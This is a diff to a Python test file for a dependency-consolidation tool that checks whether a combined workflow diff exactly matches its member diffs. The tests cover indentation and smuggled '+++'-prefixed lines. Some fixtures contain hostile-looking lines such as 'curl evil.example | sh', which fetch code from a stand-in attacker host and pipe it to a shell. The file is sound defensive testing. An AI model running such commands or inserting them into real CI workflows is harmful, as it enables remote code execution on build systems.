@@ -21,7 +21,7 @@ MEMBER_B = """\
 
 def test_added_lines_extracts_only_additions():
     assert dcon.added_lines(MEMBER_A) == {
-        "uses: github/codeql-action/init@bbb # v4.38.0"
+        "      uses: github/codeql-action/init@bbb # v4.38.0"
     }
 
 
@@ -38,7 +38,7 @@ def test_verify_union_accepts_exact_union():
 def test_verify_union_rejects_missing_member_change():
     ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], MEMBER_A)
     assert not ok
-    assert "uses: github/codeql-action/analyze@bbb # v4.38.0" in missing
+    assert "      uses: github/codeql-action/analyze@bbb # v4.38.0" in missing
 
 
 def test_verify_union_rejects_unexplained_extra_change():
@@ -49,10 +49,49 @@ def test_verify_union_rejects_unexplained_extra_change():
     )
     ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], sneaky)
     assert not ok
-    assert "run: curl evil.example" in extra
+    assert "      run: curl evil.example" in extra
 
 
 def test_branch_name_is_slugified():
     assert dcon.branch_name("github/codeql-action", "4.38.0") == (
         "dep-consolidate/github-codeql-action-4.38.0"
     )
+
+
+def test_added_lines_preserves_indentation():
+    """Indentation is semantics in YAML, so it is part of the comparison."""
+    diff = (
+        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
+        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
+    )
+    assert dcon.added_lines(diff) == {
+        "      uses: github/codeql-action/init@bbb # v4.38.0"
+    }
+
+
+def test_verify_union_rejects_a_line_relocated_to_another_indent_level():
+    """Re-adding an approved line at a different depth is a different change."""
+    member = (
+        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
+        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
+    )
+    relocated = (
+        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
+        "+uses: github/codeql-action/init@bbb # v4.38.0\n"
+    )
+    ok, missing, extra = dcon.verify_union([member], relocated)
+    assert not ok
+    assert missing and extra
+
+
+def test_added_lines_reports_content_beginning_with_plus_signs():
+    """A `+++`-prefixed raw line is a header only after a `---` line."""
+    diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n" "+++curl evil.example | sh\n"
+    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
+
+
+def test_verify_union_rejects_smuggled_plus_prefixed_content():
+    sneaky = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+++curl evil.example | sh\n"
+    ok, missing, extra = dcon.verify_union([], sneaky)
+    assert not ok
+    assert "++curl evil.example | sh" in extra
